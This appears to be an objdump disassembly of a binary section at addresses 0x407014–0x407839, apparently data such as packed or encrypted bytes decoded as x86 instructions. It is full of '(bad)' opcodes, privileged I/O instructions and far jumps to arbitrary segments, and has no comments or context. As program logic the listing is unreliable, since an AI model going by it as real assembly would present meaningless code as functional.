  407014:	sbb    DWORD PTR ds:0x62461b95,0x7a9db131
  40701e:	xchg   ebp,eax
  40701f:	adc    bl,BYTE PTR [ebp+0x54922f56]
  407025:	pop    esi
  407026:	test   BYTE PTR [edx-0x57a29ef8],0x9d
  40702d:	adc    esp,DWORD PTR [edi-0x3a]
  407030:	cli    
  407031:	(bad)
  407035:	int    0xd0
  407037:	pop    edx
  407038:	xchg   esp,eax
  407039:	push   0x7c
  40703b:	sbb    al,0x2f
  40703d:	fsub   DWORD PTR [ebp+0x6b]
  407040:	sbb    cl,dh
  407042:	fadd   QWORD PTR [ebp+0x4cf3a473]
  407048:	adc    BYTE PTR [edi+eiz*8],ch
  40704b:	aad    0x4c
  40704d:	aam    0x74
  40704f:	call   FWORD PTR [edx-0x59]
  407052:	cmp    DWORD PTR [esi+0x27],edx
  407055:	outs   dx,DWORD PTR ds:[esi]
  407056:	std    
  407057:	lock daa 
  407059:	and    al,0xc5
  40705b:	pop    esp
  40705c:	mov    gs,WORD PTR [edi+ebp*1+0x55]
  407060:	jns    0x40705f
  407062:	xchg   edi,eax
  407063:	es inc ecx
  407065:	out    dx,al
  407066:	xor    DWORD PTR [edx],eax
  407068:	mov    ecx,0x1850d0d3
  40706d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40706e:	scas   eax,DWORD PTR es:[edi]
  40706f:	sar    dl,0xa7
  407072:	jb     0x4070c5
  407074:	lods   al,BYTE PTR ds:[esi]
  407075:	call   0x292b:0x23abd3de
  40707c:	scas   eax,DWORD PTR es:[edi]
  40707d:	imul   esp,DWORD PTR [ecx+0x63],0x3d98275e
  407084:	xor    DWORD PTR [edi+0x33d4f797],eax
  40708a:	inc    esp
  40708b:	call   0x1890cac2
  407090:	loopne 0x4070a0
  407092:	or     al,bh
  407094:	sbb    bl,BYTE PTR [edx+0x6f]
  407097:	and    BYTE PTR [edx],bl
  407099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40709a:	push   es
  40709b:	push   ecx
  40709c:	or     DWORD PTR [ebx],ebp
  40709e:	or     eax,0x60d88f58
  4070a3:	xchg   esp,eax
  4070a4:	sbb    eax,0xbdccefb9
  4070a9:	add    ah,BYTE PTR [ebx-0x4f]
  4070ac:	loope  0x407062
  4070ae:	push   edx
  4070af:	fisub  DWORD PTR [ecx-0x303cbbbb]
  4070b5:	xlat   BYTE PTR ds:[ebx]
  4070b6:	and    cl,BYTE PTR [edx+0x3a]
  4070b9:	sub    bl,0x78
  4070bc:	jns    0x4070bc
  4070be:	mov    BYTE PTR [ecx-0x7a],dl
  4070c1:	mov    ds:0xb9640fd6,eax
  4070c6:	pop    ebp
  4070c7:	and    BYTE PTR [edx+0x7aef78e],dh
  4070cd:	outs   dx,DWORD PTR ds:[esi]
  4070ce:	lods   al,BYTE PTR ds:[esi]
  4070cf:	or     eax,0x49137188
  4070d4:	pop    esi
  4070d5:	fs jge 0x407084
  4070d8:	js     0x40710b
  4070da:	dec    eax
  4070db:	repnz sbb eax,0x7c675303
  4070e1:	ficom  DWORD PTR [edx+0x38]
  4070e4:	daa    
  4070e5:	call   0xd4f9:0x418447d2
  4070ec:	jge    0x4070ad
  4070ee:	fcom   st(2)
  4070f0:	push   cs
  4070f1:	mov    WORD PTR [edi-0x71],ds
  4070f4:	adc    al,0x28
  4070f6:	(bad)  [edi-0x4]
  4070f9:	lahf   
  4070fa:	into   
  4070fb:	out    0x84,al
  4070fd:	mov    ah,0x1f
  4070ff:	and    dl,BYTE PTR [eax+0x3b]
  407102:	fcom   DWORD PTR [edx-0x50]
  407105:	in     al,dx
  407106:	mov    cl,0x7d
  407108:	cmp    BYTE PTR [ecx],ch
  40710a:	imul   ebx,DWORD PTR [eax],0x959975fe
  407110:	cs stc 
  407112:	loopne 0x407140
  407114:	xchg   ecx,eax
  407115:	dec    edx
  407116:	(bad)  
  407118:	mov    eax,DWORD PTR [ecx]
  40711a:	into   
  40711b:	fsubr  QWORD PTR [edi]
  40711d:	loope  0x4070f4
  40711f:	fsubr  st,st(3)
  407121:	adc    eax,0x7bb827e5
  407126:	push   esp
  407127:	test   DWORD PTR gs:[eax+eax*8],ecx
  40712b:	or     ecx,DWORD PTR es:[eax+eax*2+0x59a96239]
  407133:	pusha  
  407134:	and    eax,0xad6ff244
  407139:	jo     0x4070eb
  40713b:	mov    ecx,DWORD PTR [ecx+0x6f]
  40713e:	adc    ecx,ebx
  407140:	adc    BYTE PTR [ebx*1-0x7144f4c2],0x32
  407148:	mov    edi,0x8b26d49d
  40714d:	jb     0x407176
  40714f:	sub    al,0x61
  407151:	add    ebp,DWORD PTR [esi]
  407153:	xor    DWORD PTR [ecx+esi*4+0x5a],edx
  407157:	sti    
  407158:	xchg   DWORD PTR [esi],edx
  40715a:	sbb    cl,ah
  40715c:	int    0x1
  40715e:	iret   
  40715f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407160:	add    esp,ecx
  407162:	mov    edx,0x3ec35c5d
  407167:	xchg   ebp,esp
  407169:	jae    0x4071a4
  40716b:	cld    
  40716c:	scas   eax,DWORD PTR es:[edi]
  40716d:	test   BYTE PTR [esi+0x6d5f4c0f],ah
  407173:	mov    al,ds:0xddee3008
  407178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407179:	push   ss
  40717a:	gs jle 0x407195
  40717d:	dec    eax
  40717e:	repnz sub DWORD PTR [edx+esi*4-0x5507644b],ecx
  407186:	mov    eax,0x87b3b4fe
  40718b:	adc    DWORD PTR [ecx+0x6e857259],esi
  407191:	dec    edx
  407192:	repz call 0x9dddc4a6
  407198:	pop    edi
  407199:	out    0xd2,eax
  40719b:	lea    ebx,[ebp+0x5c488b68]
  4071a1:	jmp    0x7fbf:0xe229a9a0
  4071a8:	mov    al,ds:0x9d0a891a
  4071ad:	ret    0xda7d
  4071b0:	or     edi,DWORD PTR [ebx+0x746da896]
  4071b6:	test   eax,0x6369d543
  4071bb:	add    bh,BYTE PTR [ebp+edi*2+0x6d]
  4071bf:	(bad)  
  4071c0:	jg     0x4071d7
  4071c2:	mov    edi,eax
  4071c4:	pop    esi
  4071c5:	and    ebx,DWORD PTR [edi+0x4cc82488]
  4071cb:	mov    ds:0xac021a07,eax
  4071d0:	scas   eax,DWORD PTR es:[edi]
  4071d1:	repz test eax,0xf3a780cb
  4071d7:	fucomip st,st(2)
  4071d9:	and    BYTE PTR [eax+0x1c],ah
  4071dc:	fwait
  4071dd:	stos   BYTE PTR es:[edi],al
  4071de:	sbb    bh,0x9b
  4071e1:	mov    BYTE PTR [esi],dl
  4071e3:	idiv   BYTE PTR [eax]
  4071e5:	int    0x20
  4071e7:	retf   0x2d6f
  4071ea:	mov    dl,0xbf
  4071ec:	add    ebp,edi
  4071ee:	mov    dh,dh
  4071f0:	add    ebx,ecx
  4071f2:	jno    0x4071bf
  4071f4:	dec    eax
  4071f5:	ficomp DWORD PTR [esi]
  4071f7:	gs pop esi
  4071f9:	shl    BYTE PTR [ebp-0x5a],1
  4071fc:	xchg   esi,eax
  4071fd:	daa    
  4071fe:	fs pop ebp
  407200:	cmp    cl,ah
  407202:	sbb    DWORD PTR [edi+0x66],eax
  407205:	push   esi
  407206:	stos   DWORD PTR es:[edi],eax
  407207:	stos   DWORD PTR es:[edi],eax
  407208:	inc    ebx
  407209:	mov    esp,0x951599c4
  40720e:	xchg   esi,eax
  40720f:	fist   DWORD PTR fs:[edi]
  407212:	inc    edi
  407213:	xchg   ebx,eax
  407214:	in     eax,0x7f
  407216:	mov    cl,al
  407218:	push   0x18777168
  40721d:	(bad)  
  40721f:	mov    cl,0xe2
  407221:	inc    ecx
  407222:	sbb    ah,dl
  407224:	rol    DWORD PTR [edi+0x43],cl
  407227:	cmp    edi,DWORD PTR [eax+0x65dc5a76]
  40722d:	sub    esi,0x5
  407230:	sub    ecx,esp
  407232:	retf   0x3af8
  407235:	xor    eax,0x6c798358
  40723a:	imul   edi,DWORD PTR ds:0x14524ab4,0xed474f04
  407244:	pop    eax
  407245:	mov    ecx,0xbbd701fe
  40724a:	push   edi
  40724b:	je     0x4071f6
  40724d:	cdq    
  40724e:	mov    bl,0x88
  407250:	xchg   esp,eax
  407251:	nop
  407252:	stc    
  407253:	rcr    esi,0xca
  407256:	push   edx
  407257:	adc    DWORD PTR [ebp-0x57e17d47],ebx
  40725d:	xchg   ecx,eax
  40725e:	mov    ecx,0xf734e552
  407263:	dec    esp
  407264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407265:	xor    DWORD PTR [eax+0x34b46253],0xe021d6e2
  40726f:	jmp    0x49d8:0x29d1bd25
  407276:	and    DWORD PTR [edi-0x1c],edi
  407279:	or     BYTE PTR [eax+esi*4],al
  40727c:	(bad)  
  40727d:	repz fs inc eax
  407280:	push   esp
  407281:	bswap  ebx
  407283:	sub    dl,BYTE PTR fs:[ebx-0x27149697]
  40728a:	cld    
  40728b:	mov    WORD PTR [ebx-0x7c],?
  40728e:	sbb    DWORD PTR [ecx+0x50],ebp
  407291:	popa   
  407292:	pop    ecx
  407293:	pop    es
  407294:	xchg   ecx,eax
  407295:	arpl   WORD PTR [ebp+edi*2-0x30b52335],di
  40729c:	or     BYTE PTR [edi],dh
  40729e:	jno    0x40725b
  4072a0:	adc    BYTE PTR [ecx],ah
  4072a2:	icebp  
  4072a3:	push   0xfffffffe
  4072a5:	loopne 0x4072d1
  4072a7:	js     0x407290
  4072a9:	fisttp WORD PTR es:[ebp+0x2b]
  4072ad:	cld    
  4072ae:	enter  0xcc61,0x5c
  4072b2:	mov    al,ds:0x6d808c92
  4072b7:	mov    ebp,0xc4e430af
  4072bc:	out    0xd7,al
  4072be:	push   ds
  4072bf:	or     ecx,DWORD PTR [ebx+0x52964b3]
  4072c5:	(bad)  
  4072c6:	xor    ebx,DWORD PTR [ebx+ebx*4]
  4072c9:	dec    esi
  4072ca:	xchg   ebp,eax
  4072cb:	xor    DWORD PTR [edi],esi
  4072cd:	call   0x8143:0xafd41009
  4072d4:	sub    ebx,DWORD PTR [ebp+0x2b]
  4072d7:	bound  ebp,QWORD PTR [ebp-0x57c0e7a6]
  4072dd:	pop    esi
  4072de:	(bad)  
  4072df:	xor    bh,bl
  4072e1:	je     0x40732f
  4072e3:	fld    TBYTE PTR [esp+edi*8]
  4072e6:	jecxz  0x4072e8
  4072e8:	dec    edi
  4072e9:	lock jo 0x407279
  4072ec:	push   eax
  4072ed:	shl    bh,cl
  4072ef:	in     al,dx
  4072f0:	cmp    ecx,DWORD PTR [ebp+eiz*8+0x6b]
  4072f4:	femms  
  4072f6:	leave  
  4072f7:	adc    edx,ebp
  4072f9:	popf   
  4072fa:	inc    edi
  4072fb:	xchg   edi,eax
  4072fc:	test   ch,al
  4072fe:	fdivr  DWORD PTR [edx-0x5ca76025]
  407304:	das    
  407305:	ret    0xa783
  407308:	out    0xf,eax
  40730a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40730b:	popa   
  40730c:	dec    edi
  40730d:	cmp    edx,DWORD PTR [ecx+0x5]
  407310:	cdq    
  407311:	lock in eax,0xbc
  407314:	mov    al,0xd4
  407316:	lods   eax,DWORD PTR ss:[esi]
  407318:	test   eax,0xc224e662
  40731d:	pop    ebp
  40731e:	mov    ebx,0xfbb4024f
  407323:	dec    esi
  407324:	push   eax
  407325:	adc    edi,eax
  407327:	mov    al,0x6d
  407329:	and    edx,DWORD PTR [ecx]
  40732b:	sbb    eax,0x3f93a02f
  407330:	adc    BYTE PTR [edx-0x40b63384],bh
  407336:	or     dh,ch
  407338:	js     0x40730b
  40733a:	bound  eax,QWORD PTR [eax]
  40733c:	mov    esi,0x160a1bb1
  407341:	cwde   
  407342:	je     0x407340
  407344:	iret   
  407345:	mov    cl,0x42
  407347:	fstp   st(6)
  407349:	test   BYTE PTR [eax-0xdb1e89f],0xd7
  407350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407351:	push   ecx
  407352:	jne    0x407366
  407354:	test   al,0xcc
  407356:	(bad)  
  407357:	test   DWORD PTR [ecx],0x274f052a
  40735d:	jecxz  0x40738d
  40735f:	aad    0xc2
  407361:	sub    ecx,esi
  407363:	push   ebp
  407364:	mov    eax,ds:0x8c9786c3
  407369:	jmp    0x55c168a7
  40736e:	or     al,0x10
  407370:	mov    eax,ds:0xf08f97bf
  407375:	adc    eax,0xf7c9eedd
  40737a:	fcom   QWORD PTR [ecx]
  40737c:	mov    ecx,0x40358cea
  407381:	rcr    BYTE PTR [edi-0x3],cl
  407384:	push   esi
  407385:	dec    edi
  407386:	lds    edx,FWORD PTR [edx+ebp*4+0x51e9706a]
  40738d:	cli    
  40738e:	aas    
  40738f:	sar    BYTE PTR [ecx-0x3d],1
  407392:	aad    0xa1
  407394:	ffreep st(6)
  407396:	outs   dx,DWORD PTR ds:[esi]
  407397:	icebp  
  407398:	loopne 0x407369
  40739a:	aaa    
  40739b:	enter  0x7d0c,0xd1
  40739f:	lahf   
  4073a0:	std    
  4073a1:	mov    edx,0xe6b7ba10
  4073a6:	sbb    eax,0xd77d60d6
  4073ab:	jbe    0x4073a2
  4073ad:	daa    
  4073ae:	sub    eax,0xddb6b537
  4073b3:	sbb    DWORD PTR [edx-0x36cbf377],esi
  4073b9:	loopne 0x407343
  4073bb:	mov    eax,0x2b56209
  4073c0:	mov    edi,0xeaf8f9fd
  4073c5:	adc    ecx,DWORD PTR [ecx]
  4073c7:	cmp    DWORD PTR [ebx+0x50],ebp
  4073ca:	xlat   BYTE PTR ds:[ebx]
  4073cb:	call   0x7fdb932c
  4073d0:	sti    
  4073d1:	in     al,0x7c
  4073d3:	lea    eax,[ecx+0x2a]
  4073d6:	es mov ch,0x2c
  4073d9:	cmp    esi,ecx
  4073db:	pop    edx
  4073dc:	in     al,0x54
  4073de:	mul    dh
  4073e0:	imul   esp,ebp,0xf1ef45c5
  4073e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073e7:	add    BYTE PTR [ebx+0x65202f3a],bh
  4073ed:	sbb    dh,BYTE PTR [eax+0x1b]
  4073f0:	stc    
  4073f1:	ins    BYTE PTR es:[edi],dx
  4073f2:	ja     0x4073a2
  4073f4:	xchg   esi,ecx
  4073f6:	add    al,0x88
  4073f8:	dec    ebp
  4073f9:	mov    dl,0x42
  4073fb:	in     al,dx
  4073fc:	pop    ss
  4073fd:	test   BYTE PTR [esi],ch
  4073ff:	retf   0x75ac
  407402:	dec    esp
  407403:	rdtsc  
  407405:	push   0x27
  407407:	cld    
  407408:	mov    cl,0x9c
  40740a:	call   0xc537:0xbd356d27
  407411:	jge    0x40739f
  407413:	xor    DWORD PTR [ebp+0x4c],ebp
  407416:	dec    ebx
  407417:	sbb    al,0x91
  407419:	and    edi,DWORD PTR [ecx+eiz*1]
  40741c:	jno    0x407430
  40741e:	pushf  
  40741f:	lock pop es
  407421:	xchg   esp,eax
  407422:	jecxz  0x40749c
  407424:	push   ecx
  407425:	sbb    DWORD PTR [ebx+0x13],esp
  407428:	jp     0x4073cc
  40742a:	mov    al,ds:0x9e138346
  40742f:	xchg   ecx,eax
  407430:	les    esi,FWORD PTR [eax-0x45]
  407433:	pop    ds
  407434:	(bad)  
  407436:	fidiv  DWORD PTR [edi+0x10bf0191]
  40743c:	sub    dl,bl
  40743e:	inc    ebp
  40743f:	in     al,0x2a
  407441:	ret    0xf8f1
  407444:	mov    fs,WORD PTR [edi+0x18]
  407447:	fisub  DWORD PTR [esi+0x11]
  40744a:	ds mov esi,es
  40744d:	xchg   ebx,eax
  40744e:	test   al,0x2c
  407450:	xchg   ebp,eax
  407451:	jb     0x4073d9
  407453:	or     bl,dh
  407455:	push   edx
  407456:	and    al,0xdb
  407458:	add    DWORD PTR [esp+ebp*1],ebp
  40745b:	out    0x4f,eax
  40745d:	cmp    dh,dl
  40745f:	sbb    BYTE PTR ds:0x800b635a,dl
  407465:	aad    0xb2
  407467:	and    DWORD PTR [esi],ecx
  407469:	cmc    
  40746a:	jp     0x407447
  40746c:	or     al,dh
  40746e:	fdiv   QWORD PTR [eax+0x70]
  407471:	jge    0x407405
  407473:	loope  0x4074a6
  407475:	xor    eax,0x5c31fb6f
  40747a:	dec    eax
  40747b:	sub    edi,DWORD PTR [ecx-0xe]
  40747e:	jne    0x4074a6
  407480:	or     DWORD PTR [ecx-0x6],edi
  407483:	and    BYTE PTR [eax-0x5a8723e8],bh
  407489:	fisub  WORD PTR [ecx+ebp*1+0x1]
  40748d:	ja     0x407469
  40748f:	dec    ebx
  407490:	xor    eax,0xde8858b2
  407495:	sbb    BYTE PTR [ecx+0x5019e40],al
  40749b:	lahf   
  40749c:	test   BYTE PTR [edx-0x80],dl
  40749f:	mov    dl,0x2d
  4074a1:	mov    ds,WORD PTR [eax-0x4c]
  4074a4:	dec    esi
  4074a5:	in     al,0xd1
  4074a7:	shl    DWORD PTR [eax+ebx*1+0x475f09e9],0x45
  4074af:	lock add al,BYTE PTR ds:0x108607d5
  4074b6:	sub    eax,0xfaf0de96
  4074bb:	xor    DWORD PTR [esi+eiz*8],0xffffffb6
  4074bf:	xor    eax,0xa78bfbbd
  4074c4:	mov    ebx,0xd607621
  4074c9:	mov    al,BYTE PTR ss:[ecx+0x7ecb7c8f]
  4074d0:	mov    esp,0xe60ac251
  4074d5:	in     eax,0x24
  4074d7:	jnp    0x4074bd
  4074d9:	add    BYTE PTR [edx],ch
  4074db:	pop    ss
  4074dc:	xchg   BYTE PTR [esi+0x77],bl
  4074df:	mov    edx,0xbc1f0a65
  4074e4:	pop    ecx
  4074e5:	pop    ebp
  4074e6:	scas   eax,DWORD PTR es:[edi]
  4074e7:	out    dx,al
  4074e8:	scas   eax,DWORD PTR es:[edi]
  4074e9:	adc    DWORD PTR [esi+eax*1+0x4a],edi
  4074ed:	adc    eax,DWORD PTR [esi+0x51c82771]
  4074f3:	lea    ebx,[ebx+edi*2+0x8cb8976]
  4074fa:	xlat   BYTE PTR ds:[ebx]
  4074fb:	xchg   ecx,eax
  4074fc:	mov    ecx,0xec2e14c0
  407501:	push   edx
  407502:	mov    eax,0xc968826f
  407507:	les    ebx,FWORD PTR [esi]
  407509:	and    ch,BYTE PTR [edx+0x1d]
  40750c:	stos   DWORD PTR es:[edi],eax
  40750d:	fsubr  QWORD PTR [ebx+0x68344e86]
  407513:	out    dx,eax
  407514:	inc    eax
  407515:	jge    0x407523
  407517:	stc    
  407518:	mov    cl,0x54
  40751a:	push   ebx
  40751b:	xlat   BYTE PTR ds:[ebx]
  40751c:	imul   ebx,esp,0x960979aa
  407522:	(bad)  
  407523:	cli    
  407524:	xor    BYTE PTR [eax+0x5b],0xa9
  407528:	aas    
  407529:	pusha  
  40752a:	and    esi,DWORD PTR [eax]
  40752c:	push   edi
  40752d:	inc    eax
  40752e:	shr    DWORD PTR [ecx+0x8],0xe5
  407532:	jmp    0xbaf74bf6
  407537:	call   esi
  407539:	mov    ecx,0xc59c457d
  40753e:	sub    DWORD PTR ds:0xd1a7335f,edi
  407544:	dec    edi
  407545:	cmp    edi,DWORD PTR [eax+0x37]
  407548:	clc    
  407549:	repnz into 
  40754b:	cli    
  40754c:	popf   
  40754d:	inc    ebx
  40754e:	arpl   WORD PTR es:[ebx+0x2dd25f5],bx
  407555:	xor    bh,BYTE PTR [edi]
  407557:	xchg   ecx,eax
  407558:	xor    BYTE PTR [esp+edx*1+0x2f],ch
  40755c:	xchg   edi,eax
  40755d:	fisub  WORD PTR [edi]
  40755f:	rol    BYTE PTR [esi],cl
  407561:	push   0x599e47f9
  407566:	stc    
  407567:	xchg   DWORD PTR fs:[esi],ebp
  40756a:	(bad)  
  40756b:	adc    BYTE PTR [esi-0x72c3a04e],cl
  407571:	xor    edx,DWORD PTR [ebp+0x3fb890ef]
  407577:	xor    al,0x5a
  407579:	imul   ebx,DWORD PTR [edx+0x491dc246],0xffffffb5
  407580:	cmc    
  407581:	test   eax,edx
  407583:	sbb    BYTE PTR [ecx+0x3a8d324f],ch
  407589:	rcr    DWORD PTR [esi+ebx*2],1
  40758c:	add    al,0x2b
  40758e:	call   0x918d:0x529de13a
  407595:	repz addr16 pop es
  407598:	mov    al,ds:0x6b99672
  40759d:	outs   dx,DWORD PTR ds:[esi]
  40759e:	(bad)  
  40759f:	arpl   ax,ax
  4075a1:	in     al,0xb9
  4075a3:	inc    esp
  4075a4:	cmp    eax,0xcc50ab48
  4075a9:	les    ebp,FWORD PTR [edi-0x61]
  4075ac:	mov    ebp,es
  4075ae:	sbb    edx,DWORD PTR [ecx]
  4075b0:	mov    cs,WORD PTR [esi-0x605f878e]
  4075b6:	mov    ds:0x3767576e,eax
  4075bb:	scas   eax,DWORD PTR es:[edi]
  4075bc:	jo     0x40761b
  4075be:	mov    cl,0xe7
  4075c0:	pop    esi
  4075c1:	shl    esp,cl
  4075c3:	xor    eax,0xeac90e22
  4075c8:	loop   0x4075c5
  4075ca:	pop    ecx
  4075cb:	xor    eax,0xc00df952
  4075d0:	pop    eax
  4075d1:	gs pop eax
  4075d3:	push   ecx
  4075d4:	out    dx,eax
  4075d5:	lock mov DWORD PTR [ebx],0x9b0adbac
  4075dc:	pusha  
  4075dd:	xor    al,cl
  4075df:	add    BYTE PTR [esi],ah
  4075e1:	xor    eax,0xc2156fe2
  4075e6:	add    edi,DWORD PTR [ebp+0x27]
  4075e9:	sbb    eax,0x7436a320
  4075ee:	mov    esp,0x3303032
  4075f3:	(bad)  
  4075f4:	loopne 0x407622
  4075f6:	mov    esi,0xa03fab5e
  4075fb:	or     edi,ecx
  4075fd:	push   cs
  4075fe:	in     eax,0x49
  407600:	mov    ah,0x69
  407602:	ret    
  407603:	test   DWORD PTR ds:0xbe827e82,ebp
  407609:	pop    ds
  40760a:	push   ebp
  40760b:	or     ebp,DWORD PTR ds:0xcc95bf95
  407611:	cmp    al,0xfe
  407613:	iret   
  407614:	pop    esp
  407615:	sar    BYTE PTR [edx+0xf],0x84
  407619:	pop    ds
  40761a:	cli    
  40761b:	cmp    al,0x2c
  40761d:	jle    0x407622
  40761f:	loop   0x407660
  407621:	retf   0x448e
  407624:	and    BYTE PTR [eax],ah
  407626:	fldcw  WORD PTR [edx+0x55]
  407629:	sahf   
  40762a:	dec    eax
  40762b:	fld    QWORD PTR [ebx+0x6e9cfc38]
  407631:	sub    cl,BYTE PTR [ebp-0x63fd491]
  407637:	jg     0x4075de
  407639:	in     al,0x59
  40763b:	retf   0xa353
  40763e:	leave  
  40763f:	out    0x4d,eax
  407641:	pop    ss
  407642:	jne    0x407675
  407644:	in     al,dx
  407645:	jl     0x407665
  407647:	call   0x7a3f:0x60644976
  40764e:	mov    edx,0x69c04d4e
  407653:	fst    QWORD PTR [ecx-0x39905e8c]
  407659:	call   0xdc84f71
  40765e:	mov    dl,0xb6
  407660:	mov    ecx,DWORD PTR [edx]
  407662:	inc    esp
  407663:	ds xchg ecx,eax
  407665:	push   edx
  407666:	outs   dx,BYTE PTR ss:[esi]
  407668:	pop    ss
  407669:	mov    al,ds:0x780d0697
  40766e:	mov    dl,0xfe
  407670:	mov    ebx,0x27125b5e
  407675:	rep movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  407678:	xor    al,BYTE PTR [ecx-0x66]
  40767b:	(bad)  
  40767d:	hlt    
  40767e:	pop    ecx
  40767f:	mov    dl,0x9
  407681:	stos   DWORD PTR es:[edi],eax
  407682:	lea    esi,[esi+0x6]
  407685:	mov    edi,0x93701743
  40768a:	jb     0x407659
  40768c:	loop   0x40762e
  40768e:	or     esp,DWORD PTR [ecx+edx*1+0x13]
  407692:	mov    al,ds:0xfd2183ed
  407697:	push   ds
  407698:	sti    
  407699:	jo     0x407696
  40769b:	jb     0x40769d
  40769d:	xchg   edx,eax
  40769e:	cld    
  40769f:	mov    ecx,0xa4f1498a
  4076a4:	fiadd  DWORD PTR [eax+0x5b]
  4076a7:	clc    
  4076a8:	popa   
  4076a9:	jb     0x4076b8
  4076ab:	sti    
  4076ac:	aad    0xa
  4076ae:	jmp    0x7392:0xc2bf891f
  4076b5:	push   edx
  4076b6:	sub    ah,al
  4076b8:	retf   0xb234
  4076bb:	out    0xee,eax
  4076bd:	js     0x407727
  4076bf:	mov    eax,ds:0xca1bbccb
  4076c4:	mov    cl,0x18
  4076c6:	inc    eax
  4076c7:	fisubr WORD PTR [edi-0x74]
  4076ca:	add    ah,BYTE PTR [esi]
  4076cc:	adc    BYTE PTR [eax-0x79],bh
  4076cf:	jmp    0x4dc1:0xbb2515b0
  4076d6:	rol    BYTE PTR [edx-0x6c],1
  4076d9:	jmp    0xaa68ee9b
  4076de:	dec    eax
  4076df:	xor    al,0x36
  4076e1:	mov    ds:0x671363a0,eax
  4076e6:	jne    0x407709
  4076e8:	loopne 0x407670
  4076ea:	or     ah,cl
  4076ec:	mov    ds,WORD PTR [ebp+0x30]
  4076ef:	mov    bh,0x3c
  4076f1:	xor    ah,BYTE PTR [edi-0x45161d5b]
  4076f7:	and    ebx,DWORD PTR gs:[eax+esi*4+0x451d2d93]
  4076ff:	rol    DWORD PTR [ebx+0x10],cl
  407702:	jmp    0x9541:0x1b91a551
  407709:	icebp  
  40770a:	fidiv  WORD PTR [ebx+0x67ea75a1]
  407710:	(bad)  
  407712:	mov    ecx,0x8e05b4df
  407717:	xchg   ebx,eax
  407718:	out    0x3e,al
  40771a:	push   ds
  40771b:	pop    edx
  40771c:	ss popf 
  40771e:	xchg   esp,eax
  40771f:	test   al,0xe6
  407721:	add    esp,0x1e8dba8e
  407727:	pusha  
  407728:	xchg   esp,eax
  407729:	mov    DWORD PTR [esi+0x55947c38],ebx
  40772f:	jecxz  0x407746
  407731:	push   0x75
  407733:	push   edi
  407734:	inc    edx
  407735:	jo     0x407797
  407737:	ds cld 
  407739:	pop    ebp
  40773a:	pop    esi
  40773b:	imul   DWORD PTR [eax]
  40773d:	push   ebp
  40773e:	and    eax,0x6f077c51
  407743:	(bad)  
  407744:	sbb    eax,0xabe10706
  407749:	mov    ebx,0xaaacfcf5
  40774e:	div    DWORD PTR [ebx]
  407750:	xchg   ecx,eax
  407751:	pop    edx
  407752:	inc    ecx
  407753:	mov    bl,0x59
  407755:	arpl   WORD PTR [edi],sp
  407757:	adc    edi,DWORD PTR ds:0x908eb181
  40775d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40775e:	iret   
  40775f:	xchg   ecx,eax
  407760:	div    BYTE PTR [esi-0x6c]
  407763:	xchg   edi,eax
  407764:	dec    ecx
  407765:	mov    ch,0x94
  407767:	push   esi
  407768:	fadd   QWORD PTR [edx+0x1336dffa]
  40776e:	cdq    
  40776f:	scas   eax,DWORD PTR es:[edi]
  407770:	mov    eax,ds:0xcf7c4410
  407775:	push   esi
  407776:	mov    bl,0xcd
  407778:	fdivrp st(0),st
  40777a:	sbb    ch,BYTE PTR [edi-0x6d]
  40777d:	(bad)  
  40777e:	mov    edx,0x4ffb7930
  407783:	outs   dx,BYTE PTR ds:[esi]
  407784:	xchg   edx,eax
  407785:	inc    esp
  407786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407787:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407789:	add    al,0xf7
  40778b:	or     al,0x62
  40778d:	aad    0x0
  40778f:	jo     0x407806
  407791:	dec    ebp
  407792:	aam    0x72
  407794:	cmp    DWORD PTR ds:0x692a9887,edx
  40779a:	arpl   WORD PTR [ebp+0x7e],di
  40779d:	mov    edi,0x65697d5c
  4077a2:	inc    edi
  4077a3:	rol    BYTE PTR [eax+esi*1],1
  4077a6:	xchg   esi,eax
  4077a7:	jmp    0x4077a1
  4077a9:	cs loop 0x40779b
  4077ac:	mov    bh,0x4f
  4077ae:	retf   0x5232
  4077b1:	outs   dx,DWORD PTR ds:[esi]
  4077b2:	scas   al,BYTE PTR es:[edi]
  4077b3:	dec    edx
  4077b4:	cmc    
  4077b5:	cmp    al,0xa9
  4077b7:	sub    al,0x74
  4077b9:	icebp  
  4077ba:	inc    esi
  4077bb:	shl    DWORD PTR [edi-0x7db995ca],cl
  4077c1:	cli    
  4077c2:	(bad)  
  4077c3:	std    
  4077c4:	iret   
  4077c5:	jno    0x407810
  4077c7:	or     al,0x18
  4077c9:	mov    edi,0x17baadd6
  4077ce:	xor    eax,eax
  4077d0:	fisubr DWORD PTR [esi+0x4149422b]
  4077d6:	popf   
  4077d7:	jae    0x4077bf
  4077d9:	inc    ebp
  4077da:	or     ebp,DWORD PTR [ecx-0xa]
  4077dd:	push   0x4a
  4077df:	mov    esi,0xf260c6f0
  4077e4:	mov    BYTE PTR [edx+0x20],cl
  4077e7:	fdiv   QWORD PTR [ebx-0xf31cd53]
  4077ed:	clc    
  4077ee:	dec    ecx
  4077ef:	mov    ah,0xe1
  4077f1:	out    0x8c,eax
  4077f3:	jl     0x407804
  4077f5:	(bad)  [eax]
  4077f7:	mov    ebp,0xa1990924
  4077fc:	or     DWORD PTR [edx],0x7
  4077ff:	add    DWORD PTR [esi-0x546f39a3],0x9ef2d36c
  407809:	add    DWORD PTR [eax],edi
  40780b:	cmp    eax,0x1f3d3398
  407810:	hlt    
  407811:	jl     0x407817
  407813:	cmp    eax,0x53670b8
  407818:	(bad)  
  407819:	cmc    
  40781a:	cmp    bl,BYTE PTR [edi+0x171be748]
  407820:	enter  0x9d50,0xb2
  407824:	adc    dl,al
  407826:	xlat   BYTE PTR ds:[ebx]
  407827:	cmp    eax,0x4ff650ab
  40782c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40782d:	leave  
  40782e:	inc    edx
  40782f:	imul   edi,DWORD PTR es:[edi],0x31cde65a
  407836:	hlt    
  407837:	in     eax,0xbc
  407839:	hlt    
